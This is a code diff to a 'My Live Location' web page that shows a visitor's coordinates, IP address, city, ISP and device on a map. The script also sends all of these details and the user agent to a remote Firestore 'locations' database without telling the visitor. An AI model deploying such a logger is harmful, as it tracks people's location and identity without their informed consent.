@@ -14,27 +14,53 @@ body{
 font-family:Arial;
 background:#f4f6fb;
 margin:0;
-text-align:center;
 }
 
 header{
 background:#ff4b5c;
 color:white;
-padding:20px;
-font-size:26px;
+padding:15px;
+font-size:22px;
+text-align:center;
 }
 
-#map{
-height:420px;
+.container{
 width:90%;
 margin:auto;
 margin-top:20px;
-border-radius:10px;
+display:flex;
+gap:20px;
+}
+
+.info{
+width:45%;
+background:white;
+padding:20px;
+border-radius:8px;
+box-shadow:0 2px 6px rgba(0,0,0,0.1);
+}
+
+.row{
+margin-bottom:12px;
+border-bottom:1px solid #eee;
+padding-bottom:6px;
+}
+
+.label{
+color:#ff4b5c;
+font-weight:bold;
+}
+
+#map{
+width:55%;
+height:400px;
+border-radius:8px;
 }
 
 #status{
 margin-top:10px;
 font-size:18px;
+text-align:center;
 }
 
 </style>
@@ -43,11 +69,32 @@ font-size:18px;
 
 <body>
 
-<header>📍 My Live Location</header>
+<header>
+📍 My Live Location
+</header>
 
 <div id="status">Please Wait...</div>
 
+<div class="container">
+
+<div class="info">
+
+<div class="row"><span class="label">Latitude:</span> <span id="lat">...</span></div>
+<div class="row"><span class="label">Longitude:</span> <span id="lon">...</span></div>
+
+<div class="row"><span class="label">Country:</span> <span id="country">...</span></div>
+<div class="row"><span class="label">City:</span> <span id="city">...</span></div>
+
+<div class="row"><span class="label">IP Address:</span> <span id="ip">...</span></div>
+<div class="row"><span class="label">ISP:</span> <span id="isp">...</span></div>
+
+<div class="row"><span class="label">Device:</span> <span id="device">...</span></div>
+
+</div>
+
 <div id="map"></div>
+
+</div>
 
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
@@ -94,51 +141,56 @@ let country_code="bd"
 let isp="unknown"
 
 try{
-  // 1) Cloudflare trace (IP + country)
-  const trace = await fetch("https://www.cloudflare.com/cdn-cgi/trace")
-  const txt = await trace.text()
 
-  const lines = txt.split("\n")
-  const map = {}
-  lines.forEach(l=>{
-    const p = l.split("=")
-    if(p.length===2) map[p[0]] = p[1]
-  })
+const trace = await fetch("https://www.cloudflare.com/cdn-cgi/trace")
+const txt = await trace.text()
 
-  ip = map.ip || ip
-  country_code = (map.loc || country_code).toUpperCase()
+const lines = txt.split("\n")
+const map = {}
 
-  // 2) Country name + city/ISP (fallback API)
-  const geo = await fetch(`https://ipwho.is/${ip}`)
-  const data = await geo.json()
+lines.forEach(l=>{
+const p = l.split("=")
+if(p.length===2) map[p[0]] = p[1]
+})
 
-  if(data.success){
-    city = data.city || city
-    country = data.country || country
-    isp = (data.connection && data.connection.isp) ? data.connection.isp : isp
-    country_code = data.country_code || country_code
-  }
+ip = map.ip || ip
+country_code = (map.loc || country_code).toUpperCase()
 
-}catch(e){
-  console.log("IP lookup failed:", e)
+const geo = await fetch(`https://ipwho.is/${ip}`)
+const data = await geo.json()
+
+if(data.success){
+city = data.city || city
+country = data.country || country
+isp = (data.connection && data.connection.isp) ? data.connection.isp : isp
+country_code = data.country_code || country_code
 }
 
-let flag = "https://flagcdn.com/48x36/" + country_code.toLowerCase() + ".png"
+}catch(e){
+console.log("IP lookup failed:", e)
+}
+
+document.getElementById("ip").innerText = ip
+document.getElementById("city").innerText = city
+document.getElementById("country").innerText = country
+document.getElementById("isp").innerText = isp
+document.getElementById("device").innerText = detectDevice()
 
 await addDoc(collection(db,"locations"),{
-  latitude: lat,
-  longitude: lon,
-  time: new Date().toISOString(),
 
-  ip: ip,
-  city: city,
-  country: country,
-  country_code: country_code,
-  flag: flag,
-  isp: isp,
+latitude: lat,
+longitude: lon,
+time: new Date().toISOString(),
 
-  device: detectDevice(),
-  userAgent: navigator.userAgent
+ip: ip,
+city: city,
+country: country,
+country_code: country_code,
+isp: isp,
+
+device: detectDevice(),
+userAgent: navigator.userAgent
+
 })
 
 }
@@ -150,8 +202,11 @@ function(position){
 let lat=position.coords.latitude
 let lon=position.coords.longitude
 
-document.getElementById("status").innerHTML=
-"Latitude: "+lat+" | Longitude: "+lon
+document.getElementById("lat").innerText = lat
+document.getElementById("lon").innerText = lon
+
+document.getElementById("status").innerHTML =
+"Location Detected"
 
 map.setView([lat,lon],15)
 
@@ -163,7 +218,7 @@ saveLocation(lat,lon)
 
 function(error){
 
-document.getElementById("status").innerHTML=
+document.getElementById("status").innerHTML =
 "Location permission denied"
 
 },
